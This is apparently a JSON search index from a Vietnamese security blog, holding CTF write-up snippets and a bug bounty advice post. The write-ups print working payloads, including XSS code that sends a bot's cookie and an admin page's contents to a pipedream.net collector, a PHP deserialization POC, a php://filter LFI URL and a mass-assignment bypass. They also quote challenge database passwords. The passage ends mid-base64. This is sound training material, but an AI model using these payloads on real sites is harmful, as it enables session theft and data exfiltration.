[ { "title": "Writeup CTF Tuyển chọn SVATT PTIT 2023", "url": "/posts/PTIT-SVATTT-2023/", "categories": "Writeup, PTITSVATTT2023", "tags": "ctf, writeup", "date": "2023-03-28 11:00:00 +0800", "snippet": "Writeup CTF Tuyển chọn SVATT PTIT 2023Web01Chúng ta được cho 2 link, 1 là link challenge, 2 là link của con bot. Kinh nghiệm cho mình thấy đây là 1 bài Reflected XSS để lấy cookieSau khi đăng ký và đăng nhập, đây là UI của web challenge gồm 1 form để nhập note, và note được nhập sẽ hiển thị ngay bên dướiTest thử với payload đơn giản &lt;img src=x onerror=alert(1), nhận thấy trang web bị lỗi XSS.Ý tưởng bây giờ là khai thác Reflected XSS để lấy cookie của bot. Payload để lấy cookie của bot:&lt;img src=x onerror=\"this.src='https://eo4kqgjvne2o998.m.pipedream.net/?'+document.cookie; this.removeAttribute('onerror');\"&gt;Giải thích payload: Javascript được thực thi sẽ gửi GET HTTP request đến URL requestbin kèm với cookie của botSau khi gửi đường link cho bot, mã Javascript được thực thi, lấy được cookie của botThay cookie của người dùng bằng Cookie của bot, truy cập admin panel ta sẽ lấy được flagWeb02UI của challenge là 1 form searchForm search làm mình nghĩ ngay đến SQLi : D. Nhưng sau khi test thử với Burp Suite và sqlmap thì mình không detect được SQLi xDdirsearch URL của challenge, tìm được 1 endpoint thú dzị là /docker-compose.ymlTruy cập 167.172.80.186:5000/docker-compose.yml lấy được password vào mysql db : DChui vào db mình lấy được flag xDWeb01-againVẫn là cái UI của bài web01 trướcvẫn là con BOT cũNhưng cái khác ở đây là không thể dùng Reflected XSS để lấy cookie của bot do có flag http-onlyÝ tưởng của mình là thay vì lấy cookie của con bot để vào được admin panel, giờ mình sẽ điều khiển con bot lấy luôn flag về cho mình : DPOC để con bot truy cập admin pannel và lấy flag cho mình&lt;script&gt; var req = new XMLHttpRequest(); // Initializes the request object req.onload=reqListener; // Set the listener reqListener that is triggered when the response is ready var url=\"http://167.172.80.186:9999/admin.php\"; // Initializes the URL of the PHP info page req.withCredentials=true; // Send the cookie header req.open(\"GET\",url,false); // The request will be sent to the PHP info page of Metasploitable 2 (192.168.240.128) through the GET method synchronously req.send(); // Send the request function reqListener() { var req2=new XMLHttpRequest(); const sess=this.responseText.substring(this.responseText.indexOf(\"ATTT\")); req2.open(\"GET\",\"https://eoisvenotwsj688.m.pipedream.net/?data=\"+btoa(sess),false); req2.send() };&lt;/script&gt;ok, giải thích qua 1 chút POCđầu tiên bot sẽ truy cập vào trang adminSau đó nó sẽ lọc response để lấy ra flag theo format ATTT{.......}bước cuối nó gửi flag để server của mình, mã hóa base64 để tránh việc request URL quá dàivà boomvà boom, againFor01Ok, challenge này cho chúng ta 1 file rar, sau khi giải nén cấu trúc thư mục sẽ như thế nàyTóm gọn lại là có 100 thư mục được đánh dấu từ 0-100, trong mỗi thư mục lại có 100 thư mục được đặt tên từ 0-100. Trong mỗi thư mục con lại có 100 file .txt 0.txt đến 100.txt . Nhiệm vụ của chúng ta là tìm ra flag trong đống file .txt đấy : D. Mình dùng python để tự động hóa quá trình tìm flag. Đây là source code:import osfor i in range(0,101): for j in range(0,101): for filename in os.listdir('./{}/{}/'.format(i,j)): f = open('./{}/{}/'.format(i,j)+filename,'r') r = f.read() if r != \"almost\" and r != \"no\" and r!=\"nah\" and r!=\"you_got_it\" and r!=\"try_again\" and r!=\"Not_this_time\" and r!=\"so_close\" and r!=\"nope\" and r!=\"better_luck_next_time\": print(r)Mình sử dụng 2 vòng lặp và đọc tất cả các file .txt trong thư mục con, kết quả tìm ra flag : DCrypto01Source code enc.cpp:#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;#define EL printf(\"\\n\")string flag = \"ATTT{fake_flag}\";void bases(string &amp;s) { for (int i = 0; i &lt; s.size(); i += 4) printf(\"%o %u %x %u \", (unsigned char) s[i], (unsigned char) s[i + 1], (unsigned char) s[i + 2], (unsigned char) s[i + 3]); EL;}int main() { freopen(\"res.txt\", \"w\", stdout); bases(flag); return 0;}Thuật toán: Lấy 4 kí tự liền nhau, kí tự đầu tiên sẽ chuyển về dạng octal, kí tự thứ 2 là dạng decimal, kí tự thứ 3 là dạng hex và kí tự thứ 4 tiếp tục là decimal, và lặp lại như vậy đến khi hết chuỗi.Mình hiểu thuật toán nhưng quên mất cách code c++, code python thì lú nên tức quá quay ra làm bằng tay xD. Bật 4 tab cyberchef và quẩy tầm 2,3p mình được flag ám ảnh nhất mình từng tìm được : D" }, { "title": "Đừng chơi Bug bounty, chạy, chạy ngay đi!!", "url": "/posts/Bugbounty/", "categories": "Blog", "tags": "bug_bounty", "date": "2022-08-11 13:00:00 +0800", "snippet": "Bug bounty là gì?MindsetMindset, hay cách giữ cho tình thần của bạn ổn định sau khi bị duplicate và tiếp tục gõ các programNếu bạn mới bắt đầu CHƠI bug bounty, nên xác định tinh thần trước rằng sẽ mất ( rất nhiều ) thời gian để có thể CHƠI được bug bounty hoặc là bug bounty sẽ CHƠI bạn mỗi ngày. Bạn sẽ cần có kiên nhẫn, quyết tâm và đam mê, đam mê, rất nhiều đam mê ( Điều quan trọng nhắc lại 3 lần ). Đây là một lĩnh vực cực kỳ cạnh tranh, đòi hỏi đam mê, chăm chỉ, tư duy tốt để có thể duy trì và phát triển được. Đối với một số người, quá trình tìm bug bounty có thể bắt đầu rất chậm và cũng có những người tìm ra lỗi ngay sau khi bắt đầu. Một điều quan trọng cần nhớ khi tìm bug bounty là đừng chán nản, khó chịu nếu bạn mất nhiều thời gian hơn để tìm thấy lỗi hợp lệ. Không phải ai cũng tìm thấy lỗi mỗi khi họ ngồi xuống và hack. Việc tìm ra lỗi rất phổ biến trong nhiều ngày, vài tuần hoặc thậm chí vài tháng. Đừng so sánh thành công hay thất bại của chính bạn với người khác. Bởi vì cũng như bất cứ điều gì khác, sẽ luôn có người tốt hơn bạn và người khác kém hơn bạn. Vì vậy, đặt ra các mục tiêu của riêng bạn và làm việc để đạt được chúng có thể rất quan trọng. ( Tommy “dawgyg” DeVoss )Ngoài làm suy sụp tinh thần của một số người thì bài học và kiến thức là phần thưởng duy nhất mà bạn sẽ luôn nhận được và nằm trong tầm kiểm soát của bạn. Vì vậy, nếu bạn là người mới bắt đầu, bạn nên đặt mục tiêu tìm hiểu về các lỗ hổng và kỹ thuật khai thác chúng hơn là kiếm được bao nhiêu tiền.Học gì để CHƠINói chung là rất nhiều thứ cần học, và việc học là việc cả đời vì đặc thù của ngành: Mọi thứ đang thay đổi từng giây, ngủ dậy cái cũng có thể thành người tối cổ ngay, đi tù hay bị băt cóc chục năm thì mình không biết ¯_(ツ)_/¯. Bài này mình chỉ tập trung vào học gì để săn bug bounty trên các web application.Kiến thức ứng dụng web cơ bản Cách request hoạt động HTTP headers JSON requests Cách browser hoạt động Cách ứng dụng giao tiếp và gửi dữ liệu với serverNhững lỗ hổng phổ biến ( Top 10 OWASP)Bạn sẽ cần hiểu rõ về nguyên nhân tồn tại (do sai sót gì, trong các chức năng nào), cách khai thác, ngăn chặn/giảm thiểu [biết cách ngăn chặn sẽ nghĩ ra cách bypass ( ͠° ͟ʖ ͡°) ] những lỗ hổng phổ biến như Remote Code Execution (RCE), Cross Site Request Forgery (CSRF), Cross Site Scripting (XSS), Injeciton (SQL injeciton, Command injection, … ), …. Bản thân mình khuyên tìm hiểu từng lỗ hổng, tái hiện lại lỗ hổng và cách khai thác lỗ hổng.Read blogs. Learn new techniques from other bug bounty hunters so that you can test it out during your testing. If you are new to Bug Bounty program, you might not feel confident that you can find something a public program. This is something that a lot of hackers are struggling with. If you haven’t found a lot of security vulnerabilities yet, it might payoff to practice on Capture The Flag (CTF). Exploiting something for the first time is difficult and eye-opening. Apply the same structure if you would apply when looking in real targets as this help you a build a solid foundation and will help you to become an amazing hacker. Use bug bounty as a way to expand your knowledge and not as a race. Write simple scripts and use available tools to expand the process of expanding attack surface […] Understand the web application and figure out what assets the web application are trying to protect. Think like an engineer of the web application. (Jobert Abma, Hackerone Cofounder)Đọc blog: Học những công nghệ mới từ những bug bounty huntrer khác, từ đó có thể áp dụng vào chính chương trình, dự án của mình. Bản thân mình đọc bounty writeup của người khác rất nhiều, cố gắng suy nghĩ và sao chép mindset của họ ( ͠° ͟ʖ ͡°), nghĩ xem tại sao họ tìm thấy lỗi đấy mà mình không tìm được :(. Mỗi khi thấy 1 lỗi thú vị, mình thường thử áp dụng vào các target hiện tại của mình. Nếu bạn là một người mới, mình khuyên bạn nên chơi CTF ( tất nhiên là đừng để CTF chơi bạn ). Chơi CTF có thể giúp bạn luyện tập phản xạ, nâng “sense” của mình lên ( cách tiếp cận target, tính năng nào thường bị lỗ hổng nào )Học cách tạo ra một trang web/ứng dụng: Bạn cần biết cách mà một ứng dụng web được tạo ra trước, sau khi đã hiểu cách mà mọi thứ được tạo ra và hoạt động, bạn sẽ tìm ra cách để khai thác cũng như cách phòng chống, từ cách phòng chống lại nghĩ ra cách bypass ( ͠° ͟ʖ ͡°).Phương pháp CHƠIPick targetTìm một target ngon sẽ phụ thuộc vào những yếu tố sau:Ngày công bố chương trìnhNên tập trung vào những chương trình mới được công bố, thay vì những chương trình cũ đã được các bounty hunter khác vọc nát rồi :^. Thỉnh thoảng mình vẫn chọn program cũ vì ai cũng nghĩ nó cũ nên không đụng vào =))) vì một số yếu tố nữa mà mình sẽ đề cập ngay dướiPhản hồiThời gian phản hồi và cách phản hồi cũng là một tiêu chí để mình đánh giá chương trình có thơm hay không =)). Nếu một chương trình phản hồi chậm hay thiếu chuyên nghiệp, “lươn lẹo” giảm impact vô lý thì mình sẽ skip. Thường thì mình sẽ “thử lửa” bằng cách submit 1 lỗi P5 để xem thời gian phản hồi và cách họ phản hồi ra sao để quyết định có nên theo và đào sâu target hơn không.Scope (Phạm vi của chương trình)Phạm vi của chương trình càng lớn càng tăng khả năng lỗi không bị duplicateBạn có cảm thấy hứng thú với program đó không?Với mình, đây là cái quan trọng nhất. Việc bạn hứng thú hay không sẽ ảnh hưởng rất lớn đến năng suất làm việc của bạn, khi hứng thú thì bạn sẽ đầu tư thời gian và tâm huyết với nó. Vậy nên đừng cố gắng ôm một cái program mà bạn không yêu, đau khổ lắm 💔Tiền thưởngCái này thì tùy mỗi người, ai làm vì đam mê thì skip nhé =)))))). Tiền thưởng lỗi cũng nên là một tiêu chí để bạn quyết định gõ nó hay không. Không ai muốn tìm sml ra 1 cái P1 được trả tiền bằng cái P3 ở program khác, factos ( ͠° ͟ʖ ͡°)Cách tiếp cận một targetCách mà mình tiếp cận và recon một em hàng ngọt nước. Cái này chỉ để tham khảo thôi (và mình cũng muốn chia sẻ nữa :3 ), vì có n+1 cách ( n thuộc N*) khácMình sẽ lấy một program làm ví dụ để dễ hình dung cách mình recon hơn. Đây cũng là dạng program mà mình thích ( nhiều nước, lộn, nhiều subdomain )Sau khi đọc qua phần Chính sách, Out-of-scope thì mình sẽ ngó qua Scope, Scope nhiều thế này thì phải vụt. ( program này là VDP, nôm na là sẽ không có tiền, nhưng nếu bạn mới tham gia bug bounty thì cứ thử và tận hưởng cảm giác duplicate đi )Không lòng vòng nữa, đầu tiên khi thấy một đống subdomain thế này, mình sẽ dùng amass để liệt kê toàn bộ subdomain, và dùng httpx để check xem subdomain nào còn sốngamass enum -d domain | httpx -title -status-codeKí tự “|” để mình chain 2 câu lệnh với nhau, đại khái nó sẽ lấy đầu ra câu lệnh trước làm đầu vào cho câu lệnh tiếp theo, muốn hiểu rõ hơn thì bạn nên làm 1 khóa linux cơ bản :^Sau khi có list các subdomain còn sống, mình sẽ đi sâu vào từng subdomain 1: Xem qua các công nghệ mà trang web đang sử dụng Google dorking Dirsearch/ffuf Sử dụng JSFinder để kiểm tra xem có thông tin nhạy cảm bị lộ không Rà quét trang web sử dụng Nuclei Liệt kê các endpoint, chức năng của trang web, hiểu rõ nghiệp vụ của từng chức năng. Dạo gần đây mình hay sử dụng gau (get all url) để list ra các url của trang web.Well, sơ sơ cũng chỉ vậy thôi, còn đi sâu vào từng chức năng thì test theo check list, hoặc làm nhiều bạn sẽ tự biết chức năng nào thường hay dính lỗi nào¯_( ͡° ͜ʖ ͡°)_/¯Focus vào cái gì ?Cái này cần câu cơm nên mình không share đâu 🐧TipsGitlab Ưu tiên những lỗi nghiêm trọng (P1) Không ai muốn dành nhiều thời gian để phân tích những lỗi Low Lắng nghe, xem xét phản hồi của các bên liên quan, đôi lúc nó có thể giúp ích Mình từng tìm được 1 lỗi P5, và ông verify đã rep lại khá nhiệt tình, gợi ý cho mình các attack vector để có thể nâng impact của lỗ hổng lên Sử dụng công cụ tự động hóa ( Bản thân mình không khuyến khích, công cụ ai cũng có thể dùng và quét ra được )Portswigger Hiểu quy trình, nghiệp vụ của mục tiêu Tập trung vào 1 loại lỗ hổng cụ thể ( Và kiểm tra lần lượt từng loại lỗ hổng ) Đọc các writeup, report về loại lỗ hổng đó Tập trung vào tìm loại lỗ hổng này trên mục tiêu của bạn Làm quen với ứng dụng, hiểu được nghiệp vụ, luồng, tính năng của ứng dụng Tập trung tìm hiểu cách mọi thứ hoạt động thay vì chạy các công cụ tự động Tìm lỗ hổng ở những vị trí chưa có/ít người quan tâm Chọn 1 program cũ, bounty nhỏ Program có scope rộng ( nhiều subdomain, domain ) Không ngừng học hỏi ( Đọc writeup, bug bounty report, blog, phân tích 1-day, … ) Kiểm tra các attack vector không phổ biến Thực hiện các hành động không mong muốn (không gửi những gì ứng dụng, người phát triển mong muốn ) Thay vào đó, nghĩ về những điều mà mấy ông dev không nghĩ đến, không xem xét, bỏ sót.Zwink Coi Bug bounty như 1 game nhập vai ( nghe hơi ảo game nhưng theo mình hiểu ý của Zwink là enjoy nó, vì bằng cách này hay cách khác, nó sẽ up level của bạn, và đừng buồn khi bị dup :)) Nó là điều tất yếu, bạn không bị dup thì tôi bị dup, và ngược lại. Luôn có người bị dup :)) ) Học trên Portswigger Academy và tìm hiểu về các lỗ hổng hệ thống phân loại lỗ hổng của BugCrowd (BugCrowd VRT) Kiếm lỗ hổng valid đầu tiên ( P4 cũng ổn, P3, P2, P1 thì càng ok ) Quan trọng là nó sẽ giúp bạn có thêm động lực, có thêm cơ hội được mời vào private program ( đỡ cạnh tranh hơn ) Test tay để tránh bị trùng lỗ hổng, sử dụng VPN phòng trường hợp bị firewall block Sau khi quen rồi thì tập trung vào tìm các lỗ hổng ở mức cao hơnTài nguyênMột bài mình thấy tổng hợp khá đủ:Gold Bug Bounty Resources in 2022Youtube (Nói chung tùy người, bạn thấy hợp ai thì xem người đó) LiveOverflow Bugcrowd InsiderPhD Nahamsec STÖK SecurityIdiots Z-winK University (ZU) - Bug Bounty Education Hack ‘Em All John Hammond CyberJutsuTVCơm thêmhttps://github.com/bobby-lin/study-bug-bounty" }, { "title": "Are you the admin? TFCCTF 2022", "url": "/posts/RUTheAdmin-TFCCTF2022/", "categories": "Writeup, TFCCTF 2022", "tags": "web, writeup", "date": "2022-08-02 08:00:00 +0800", "snippet": "ARE YOU THE ADMIN? - TFCCTF2022Source code đi kèmschema.prismagenerator client { provider = \"prisma-client-js\"}datasource db { provider = \"sqlite\" url = \"file:./app.db\"}model User { id String @id @default(uuid()) username String isAdmin Boolean @default(false)}auth.tsimport { NextApiRequest, NextApiResponse } from \"next\";import { prisma } from \"../../globals/prisma\";export default async function handler( req: NextApiRequest, res: NextApiResponse) { const body = req.body; await prisma.user.create({ data: body, }); return res.status(200).end();}index.tsximport type { GetServerSideProps, NextPage } from \"next\";import type { User } from \"@prisma/client\";import { prisma } from \"../globals/prisma\";import { useState } from \"react\";import { useRouter } from \"next/router\";type Props = { users: (User &amp; ( | { flag: string; isAdmin: true; } | { flag?: never; isAdmin: false; } ))[];};const Home: NextPage&lt;Props&gt; = ({ users }) =&gt; { const [username, setUsername] = useState(\"\"); const router = useRouter(); const create = async () =&gt; { await fetch(\"/api/auth\", { headers: { \"Content-Type\": \"application/json\", }, method: \"POST\", body: JSON.stringify({ username, }), }); await router.replace(router.asPath); }; return ( &lt;div&gt; &lt;div&gt;Create user:&lt;/div&gt; &lt;input value={username} onChange={(event) =&gt; setUsername(event.target.value)} /&gt; &lt;button onClick={create}&gt;Create&lt;/button&gt; &lt;div&gt;Users:&lt;/div&gt; {users.map((user) =&gt; ( &lt;div key={user.id}&gt; &lt;div&gt;Username: {user.username}&lt;/div&gt; &lt;div&gt;Is admin? {user.isAdmin ? \"yes\" : \"no\"}&lt;/div&gt; {user.isAdmin &amp;&amp; &lt;div&gt;{user.flag}&lt;/div&gt;} &lt;/div&gt; ))} &lt;/div&gt; );};export default Home;export const getServerSideProps: GetServerSideProps&lt;Props&gt; = async ( context) =&gt; { const users = (await prisma.user.findMany()) as Props[\"users\"]; for (const user of users) { if (user.isAdmin) { user.flag = process.env.FLAG!; } } return { props: { users, }, };};Trang web rất đơn giản, gồm 1 cái form để điền username và nút CreateKhi click vào button Create, web sẽ POST đến endpoint /api/auth với body là usernameĐọc code để xem endpoint /api/auth sẽ làm gìTheo mình hiểu thì nó sẽ lấy dữ liệu được POST lên và tạo 1 user mớiNếu user là admin, web sẽ lấy flag và in raOk quay trở lại với request create userVì /api/auth không hề check lại body hay lọc dữ liệu mà chỉ lấy toàn bộ body nên mình chỉ cần thêm trường “isAdmin”:trueOk ngon lànhFlag: TFCCTF{S4n1t1z3_Y0ur_1nput5!}" }, { "title": "WhiteHat Play 11 Writeup", "url": "/posts/WhiteHat11/", "categories": "Writeup", "tags": "writeup, whitehatplay", "date": "2022-07-14 16:00:00 +0800", "snippet": "WhiteHat Play 11 WriteupWhite Hat 11WhiteHat 11 đã kết thúc được vài tuần (mình không nhớ nữa, quá già để nhớ rồi :^) ). Và đây là phần writeup về tất cả các web challenge. Xin lỗi vì nó không theo thứ tự ( Mình viết blog dựa trên bản mình đã note lại trong lúc làm )Web07View source của web07, chúng ta sẽ thấy tác giả đã để lại hint &lt;!-- debug: GET is_debug=1 --&gt; để anh em có thể đọc code php&lt;head&gt; &lt;title&gt; Hello 500 AEm-xiao &lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;center&gt; &lt;h1 style=\"color:green;\"&gt;xiao hello anh emmmmm&lt;/h1&gt; &lt;h3&gt;Join the race!!!!&lt;/h3&gt; &lt;/center&gt; &lt;div&gt;&lt;form&gt; Your Username:\t&lt;input name=\"uname\" type=\"text\" alt=\"uname\" align=\"right\"&gt;\tMessage: &lt;!--Here type=\"text\" align will not work--&gt; &lt;input name=\"mess\" type=\"text\" alt=\"mess\" align=\"right\"&gt;&lt;input type=submit &gt; &lt;/div&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;!-- debug: GET is_debug=1 --&gt;&lt;head&gt; &lt;title&gt; Hello 500 AEm-xiao &lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;center&gt; &lt;h1 style=\"color:green;\"&gt;xiao hello anh emmmmm&lt;/h1&gt; &lt;h3&gt;Join the race!!!!&lt;/h3&gt;&lt;?php if(isset($_GET['uname']) &amp;&amp; isset($_GET['mess'])){\t$user = new User($_GET['uname'],$_GET['mess']);\t$user-&gt;say();}?&gt; &lt;/center&gt; &lt;div&gt;&lt;form&gt; Your Username:\t&lt;input name=\"uname\" type=\"text\" alt=\"uname\" align=\"right\"&gt;\tMessage: &lt;!--Here type=\"text\" align will not work--&gt; &lt;input name=\"mess\" type=\"text\" alt=\"mess\" align=\"right\"&gt;&lt;input type=submit &gt; &lt;/div&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;!-- debug: GET is_debug=1 --&gt;&lt;?phpif(isset($_GET['is_debug']) &amp;&amp; $_GET['is_debug']==='1'){ echo file_get_contents(__file__);}?&gt;&lt;/body&gt;&lt;?phpclass getFileSystem{\tpublic function __wakeup(){\t\tinclude('flag.php');\t\techo $flag;\t}}class User{\tpublic function __construct($u,$m){\t$this-&gt;username = $u;\t$this-&gt;message = $m;\t}\tpublic function say(){\t\techo \"&lt;h3 style=color:red&gt;\".$this-&gt;username.\" say: \".$this-&gt;message.\"&lt;/h3&gt;\";\t}\tpublic function __destruct(){\t\tif ($this-&gt;message==\"DucBTTBcuD\"){\t\t\tunserialize(base64_decode($this-&gt;username));\t\t}\t}}?&gt;&lt;/body&gt;Trong phần code PHP, chúng ta thấy magic function __wakeup() (Hàm được gọi khi unserialize một chuỗi thành đối tượng) sẽ include file flag.php và in ra flagỞ dưới là hàm check xem message có giá trị là DucBTTBcuD không, nếu có sẽ thực hiện base64 decode và unserialize chuỗi vừa base64 decodeTừ đây não mình đã load được vector tấn công: chúng ta sẽ serialize 1 biến thuộc class getFileSystem và base64 encode chuỗi vừa serialize, sau đó bỏ chuỗi đó vào làm tên user + thêm nội dung tin nhắn DucBTTBcuD . Dưới đây là POC:POC&lt;?phpclass getFileSystem{\tpublic function __wakeup(){\t\tinclude('flag.php');\t\techo $flag;\t}}class User{\tpublic function __construct($u,$m){\t$this-&gt;username = $u;\t$this-&gt;message = $m;\t}\tpublic function say(){\t\techo \"&lt;h3 style=color:red&gt;\".$this-&gt;username.\" say: \".$this-&gt;message.\"&lt;/h3&gt;\";\t}\tpublic function __destruct(){\t\tif ($this-&gt;message==\"DucBTTBcuD\"){\t\t\tunserialize(base64_decode($this-&gt;username));\t\t}\t}}$a = new User(\"hehe\",\"DucBTTBcuD\");$b = new getFileSystem();echo(base64_encode(serialize($b)));?&gt;Web01Bài này là bài web đầu tiên mình gõ, nhưng lúc đấy bị lỗi triển khai nên mình thó cờ khá dễ =)) Anw, đây là cách mình gõ Web01.Đầu tiên theo phản xạ khi tiếp cận 1 trang web, mình sử dụng dirsearch và quan sát thấy 1 đường dẫn trả về 200, đó là docker-compose.ymlTruy cập &lt;địa chỉ ip&gt;/docker-compose.yml, mình được nội dung file như bên dướiversion: '3.7'services: php-env: build: . ports: - '9020:80' volumes: - .:/var/www/html db: image: mysql command: --default-authentication-plugin=mysql_native_password restart: always volumes: - ./ctf.sql:/docker-entrypoint-initdb.d/ctf.sql environment: MYSQL_ROOT_PASSWORD: Nhat1998@ MYSQL_DATABASE: ctf MYSQL_USER: nhat1 MYSQL_PASSWORD: ywcQo7H]TsgLj35j@Mình để ý đến ./ctf.sql , nghĩa là file ctf.sql đang ở thư mục gốc của trang web, thử &lt;địa chỉ ip&gt;/ctf.sql,file ctf.sql đã được tải về thành công =)))Mở file ctf.sql ra, chúng ta có flag =))Tóm tắt lại thì bài nàyWeb05Truy cập link của web05 do ban tổ chức cung cấp, chúng ta có giao diện trang web:Khi đăng nhập sai, người dùng sẽ được redirect đến trang source code PHP&lt;?php session_start(); $_SESSION['login'] = False; //checklogin if (isset($_POST['username']) &amp;&amp; $_POST['phone']){ if($_POST['username']==\"DucBT\" &amp;&amp; $_POST['phone'] == \"09xxxxxxx5\"){//10^10 bruteforce? $_SESSION['login'] = True; } } //get flag if ($_SESSION['login'] == True){ include_once 'get_flag.php'; session_destroy(); } echo show_source(\"check.php\", true);?&gt;Bài này khá là hài, vì lúc đầu mình đã bị lú và nghĩ theo hướng type juggling (loose comparison)Não delay 1 lúc mới đọc kĩ code và giải được : ( Đoạn code PHP sẽ so sánh giá trị username do người dùng nhập vào với chuỗi DucBT , tương tự, đoạn code sẽ đồng thời so sánh giá trị password do người dùng nhập vào với chuỗi 09xxxxxxx5 , nếu cả 2 so sánh thỏa mãn sẽ trả về flag. Việc của chúng ta là chỉ cần nhập vào 2 giá trị DucBT và 09xxxxxxx5 (Lú như T nú)Flag: WhiteHat{Pe0ple_m4ke_it_complicated} &lt;?php session_start(); $_SESSION['login'] = False; //checklogin if (isset($_POST['username']) &amp;&amp; $_POST['phone']){ if($_POST['username']==\"DucBT\" &amp;&amp; $_POST['phone'] == \"09xxxxxxx5\"){//10^10 bruteforce? $_SESSION['login'] = True; } } //get flag if ($_SESSION['login'] == True){ include_once 'get_flag.php'; session_destroy(); } echo show_source(\"check.php\", true);?&gt;Web03Web03 chỉ là bài warmup =)) Tất cả việc cần làm là view source và copy flag 🦝WhiteHat{N0nG_NhU_th3_n4y_th1_l4M_s40_Ph41_M4c}Web08Giao diện của web08Web08 có source code PHP như sau:&lt;?php error_reporting(0); if (isset($_GET['input'])) { $input = $_GET['input']; $to_replace = 'DucBTTPA'; $clean_string = preg_replace(\"/$to_replace/\", '', $input); echo \"&lt;p&gt;Your string is: $clean_string&lt;/p&gt;\"; if ($clean_string === $to_replace) { if(isset($_GET['input2']) &amp;&amp; isset($_GET['input3'])){ $input2 =$_GET['input2']; $input3 =$_GET['input3']; if($input2!==$input3 &amp;&amp; hash(\"sha256\",$input2)==hash(\"sha256\",$input3)){ echo \"&lt;h2 class=\\\"answer\\\"&gt;&lt;span style=\\\"color: green;\\\"&gt;Yesssss&lt;/span&gt;&lt;/h2&gt;\"; echo $flag; } } } else { echo \"&lt;h2 class=\\\"answer\\\"&gt;&lt;span style=\\\"color: red;\\\"&gt;Nooooo &lt;/span&gt;&lt;/h2&gt;\"; } } ?&gt;Đoạn code sẽ thực hiện thay loại bỏ chuỗi DucBTTPA trong chuỗi đầu vào của người dùng và tiếp tục so sánh đầu vào của người dùng với chuỗi cần loại bỏ DucBTTPA ( Nghe trái khoáy vl (●’◡’●) ). Nếu chuỗi bị loại bỏ vẫn còn tồn tại thì sẽ tiếp tục đi vào 1 đoạn if nữa mà mình sẽ giải thích ở dưới. Bây giờ tập trung vào pass được điều kiện của câu if đầu tiên 🦝 Đơn giản để thấy đoạn code thực hiện loại bỏ chuỗi DucBTTPA chỉ thực hiện loại bỏ 1 lần chuỗi cần loại bỏ, cho nên bypass rất dễ bằng cách nhập vào chuỗi DucBTDucBTTPATPA , vì chỉ loại bỏ 1 lần nên chuỗi sau khi loại bỏ sẽ vẫn là chuỗi DucBTTPAHoặc có thể nhập chuỗi như hình dưới, kết quả tương tựTiếp theo, đoạn code sẽ thực hiện check input2 và input3 là giá trị đầu vào do người dùng cung cấp, nếu giá băm bằng thuật toán SHA-256 của 2 chuỗi giống nhau thì sẽ trả về flagMình sử dụng magic hashes ( Đại loại là những chuỗi khác nhau nhưng sẽ cùng cho ra 1 giá trị băm (Keyword hash collisioncho bạn nào muốn research thêm :3 ) List các magic hashes mình để ở đây: hashes/sha256.md at master · spaze/hashes (github.com)Sau khi cung cấp đầu vào input1, input2 là các chuỗi magic hash, chúng ta sẽ có flag ╰(°▽°)╯http://192.81.209.60:8844/?input=DuDucBTTPAcBTTPA&amp;input2=34250003024812&amp;input3=TyNOQHUSWeb04Giao diện của Web04, chức năng đơn giản trên trang web là bạn nhấn vào 1 trong 5 địa chỉ, trang web sẽ render ra 1 tấm ảnh về địa chỉ đấyĐể ý URL của trang web có dạng http://&lt;địa chỉ ip&gt;/index.php?gif=&lt;Tên địa chỉ&gt; mình đã nghỉ đến Path Traversal, nhưng thử 1 hồi không ra và 1 người anh đáng mến đã gợi ý cho mình về 1 kỹ thuật mà mình lãng quên PHP Wrapper.Sử dụng php://filter/convert.base64-encode/resource=index để lấy source code của trang index.php dưới dạng base64http://164.92.81.231:8004/index.php?gif=php://filter/convert.base64-encode/resource=indexTrang web trả về chuỗi base64PGh0bWw+DQo8dGl0bGU+U2VsZWN0IFRyaXA8L3RpdGxlPg0KPGJvZHk+DQoNCgkNCjxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iZHVjYnQuY3NzIj4NCjxoMSBzdHlsZT0iZm9udC1mYW1pbHk6IGN1cnNpdmU7Ij5TZWxlY3QgbTMuLjwvaDE+DQo8Zm9ybSBhY3Rpb249ImluZGV4LnBocCIgbWV0aG9kPSdnZXQnIG5hbWU9IiIgID4NCgk8ZGl2IGNsYXNzPSJjb250YWluZXIiPg0KICAgIDxkaXYgY2xhc3M9InJvdyBzaGFyZS1idXR0b25zIj4NCiAgICAgICAgPGRpdiBjbGFzcz0iY29sLW1kLTggY29sLW1kLW9mZnNldC0yIj4NCiAgICAgICAgIDxkaXYgc3R5bGU9Im1hcmdpbjogYXV0bzsiPg0KICAgICAgICAgCSAgIDx1bCA+DQogICAgICAgICAgICAgICAgPGxpID4NCiAgICAgICAgICAgICAgICAgICAgPGgxPjB4Nzg8L2gxPg0KICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJidXR0b24iIHR5cGU9InN1Ym1pdCIgbmFtZT0nZ2lmJyB2YWx1ZT0nY290byc+DQogICAgICAgICAgICAgICAgICAgICAgICA8aSBjbGFzcz0iZmEgZmEtZ2l0aHViIj48L2k+DQogICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBDw7QgVMO0DQogICAgICAgICAgICAgICAgICAgIDwvYnV0dG9uPg0KICAgICAgICAgICAgICAgIDwvbGk+DQogICAgICAgICAgICAgICAgPGxpPg0KICAgICAgICAgICAgICAgICAgICA8aDE+MHgxMTE8L2gxPg0KICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJibHVlIGJ1dHRvbiIgdHlwZT0ic3VibWl0IiBuYW1lPSdnaWYnIHZhbHVlPSdjb25kYW8nPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGkgY2xhc3M9ImZhIGZhLXR3aXR0ZXIiPjwvaT4NCiAgICAgICANCiAgICAgICAgICAgICAgICAgICAgIEPDtG4gxJDhuqNvDQogICAgICAgICAgICAgICAgICAgIDwvYnV0dG9uPg0KICAgICAgICAgICAgICAgIDwvbGk+DQogICAgICAgICAgICAgICAgPGxpPg0KICAgICAgICAgICAgICAgICAgICA8aDE+MHgxMTE8L2gxPg0KICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJidXR0b24gcGluayIgdHlwZT0ic3VibWl0IiBuYW1lPSdnaWYnIHZhbHVlPSdreWNvJz4NCiAgICAgICAgICAgICAgICAgICAgIC